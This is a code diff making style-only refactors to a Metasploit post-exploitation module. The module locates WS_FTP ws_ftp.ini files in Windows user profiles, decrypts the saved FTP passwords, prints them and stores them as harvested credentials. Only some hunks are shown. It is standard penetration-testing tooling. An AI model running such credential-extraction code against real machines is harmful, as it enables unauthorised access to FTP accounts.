@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,30 +9,28 @@ require 'rex'
 require 'rex/parser/ini'
 require 'msf/core/auxiliary/report'
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather WS_FTP Saved Password Extraction',
-        'Description'   => %q{
-          This module extracts weakly encrypted saved FTP Passwords
-          from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'theLightCosine'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather WS_FTP Saved Password Extraction',
+                      'Description'   => %q(
+                        This module extracts weakly encrypted saved FTP Passwords
+                        from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'theLightCosine'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
   end
 
   def run
     print_status("Checking Default Locations...")
-    grab_user_profiles().each do |user|
-      next if user['AppData'] == nil
+    grab_user_profiles.each do |user|
+      next if user['AppData'].nil?
       check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini")
       check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini")
     end
@@ -59,12 +58,12 @@ class MetasploitModule < Msf::Post
       host = host.delete "\""
       username = ini[group]['UID']
       username = username.delete "\""
-      port = 	ini[group]['PORT']
+      port =	ini[group]['PORT']
       passwd = ini[group]['PWD']
       passwd = decrypt(passwd)
 
-      next if passwd == nil or passwd == ""
-      port = 21 if port == nil
+      next if passwd.nil? || (passwd == "")
+      port = 21 if port.nil?
       print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
       service_data = {
         address: Rex::Socket.getaddress(host),
@@ -77,7 +76,7 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: username,
         private_data: passwd,
         private_type: :password
@@ -106,6 +105,6 @@ class MetasploitModule < Msf::Post
     des.iv = iv
     result = des.update(decoded)
     final = result.split("\000")[0]
-    return final
+    final
   end
 end
